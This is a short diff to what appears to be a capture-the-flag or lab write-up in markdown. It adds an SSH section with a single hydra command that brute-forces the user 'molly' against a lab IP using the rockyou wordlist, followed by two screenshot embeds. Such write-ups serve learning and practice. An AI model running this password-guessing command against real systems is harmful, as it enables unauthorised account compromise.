@@ -85,3 +85,14 @@ When we enters wrong passwords it gives ==`Your username or password is incorrec
 ```
 
 ```
+
+
+## SSH
+
+```
+hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.48.162.202 -t 4 ssh
+```
+
+![[Pasted image 20260122193619.png]]
+
+![[Pasted image 20260122193705.png]]
